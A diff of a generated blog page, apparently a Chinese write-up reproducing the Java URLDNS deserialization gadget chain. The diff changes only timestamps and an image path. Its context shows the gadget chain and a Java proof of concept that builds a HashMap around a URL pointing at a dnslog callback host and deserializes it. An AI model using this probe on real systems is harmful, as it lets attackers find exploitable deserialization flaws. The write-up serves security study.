@@ -153,7 +153,7 @@
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2024-08-19 12:09:35
+          2024-08-19 19:27:49
         </span>
         
               <span class="post-tags">
@@ -195,7 +195,7 @@
 <p><code>HashMap.readObject()-&gt;HashMap.hash()-&gt;URL.hashCode()-&gt;URLStreamHandler.hashCode()-&gt;URLStreamHandler.getHostAddress()</code>​</p>
 <h2 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.toothless;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDnsSerializDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://bd645a88.log.dnslog.biz.&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(url, <span class="number">123</span>);</span><br><span class="line">        hashMap.put(url, <span class="string">&quot;rmb122&quot;</span>);</span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line"><span class="comment">//        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));</span></span><br><span class="line"><span class="comment">//        oos.writeObject(hashMap);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="/source/imgs/$%7Bfiilename%7D/image-20240815152055-dm5teuy-1724037693191-8-1724039698599-2.png" alt="image-20240815152055-dm5teuy-1724037693191-8"></p>
+<p><img src="/source/imgs/$%7Bfiilename%7D/image-20240815152055-dm5teuy-1724037693191-8.png" alt="image-20240815152055-dm5teuy-1724037693191-8"></p>
 
       </div>
       
@@ -206,7 +206,7 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2024-08-19 12:09:35
+              2024-08-19 19:27:49
             </span>
             
                   <span class="post-tags">
